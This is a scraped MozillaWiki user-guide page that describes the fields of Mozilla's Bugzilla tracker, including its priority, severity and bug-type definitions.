Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from wiki.mozilla.org_73f8d6fa_20250126_104321.html ===


# BMO/UserGuide/BugFields

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)
## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

Retrieved from "<https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&oldid=1250790>"

## Navigation menu

### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=BMO%2FUserGuide%2FBugFields "You are encouraged to log in; however, it is not mandatory [o]")
* [Request account](/Special%3ARequestAccount "You are encouraged to create an account and log in; however, it is not mandatory")

### Namespaces

* [Page](/BMO/UserGuide/BugFields "View the content page [c]")
* [Discussion](/index.php?title=Talk:BMO/UserGuide/BugFields&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

### Views

* [Read](/BMO/UserGuide/BugFields)
* [View source](/index.php?title=BMO/UserGuide/BugFields&action=edit "This page is protected.
  You can view its source [e]")
* [View history](/index.php?title=BMO/UserGuide/BugFields&action=history "Past revisions of this page [h]")

More

### Search

### Navigation

* [Main page](/Main_Page "Visit the main page [z]")
* [Product releases](/Releases)
* [New pages](/Special%3ANewPages)
* [Recent changes](/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Recent uploads](/Special%3ANewFiles)
* [Random page](/Special%3ARandom "Load a random page [x]")
* [Help](/MozillaWiki%3AHelp "The place to find out")

### How to Contribute

* [All-hands meeting](/WeeklyUpdates)
* [Other meetings](/Community_Calendar)
* [Contribute to Mozilla](/Contribute)
* [Community Portal](//community.mozilla.org)
* [Community Participation Guidelines](//www.mozilla.org/en-US/about/governance/policies/participation/)

### MozillaWiki

* [About](/MozillaWiki%3AAbout)
* [Team](/MozillaWiki%3ATeam)
* [Policies](/MozillaWiki%3APolicies)
* [Report a wiki bug](//bugzilla.mozilla.org/enter_bug.cgi?product=Websites&component=wiki.mozilla.org)

### Around Mozilla

* [Mozilla Support](//support.mozilla.org/)
* [Mozilla Developer Network](//developer.mozilla.org/)
* [Planet Mozilla](//planet.mozilla.org/)
* [Mozilla Blog](//blog.mozilla.org/)
* [Research](//www.mozilla.org/research/)

### Tools

* [What links here](/Special%3AWhatLinksHere/BMO/UserGuide/BugFields "A list of all wiki pages that link here [j]")
* [Related changes](/Special%3ARecentChangesLinked/BMO/UserGuide/BugFields "Recent changes in pages linked from this page [k]")
* [Special pages](/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=BMO/UserGuide/BugFields&oldid=1250790 "Permanent link to this revision of this page")
* [Page information](/index.php?title=BMO/UserGuide/BugFields&action=info "More information about this page")

* This page was last edited on 14 May 2024, at 14:22.

* [Privacy policy](/MozillaWiki%3APrivacy_policy)
* [About MozillaWiki](/MozillaWiki%3AAbout)
* [Mobile view](https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&mobileaction=toggle_view_mobile)

* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)


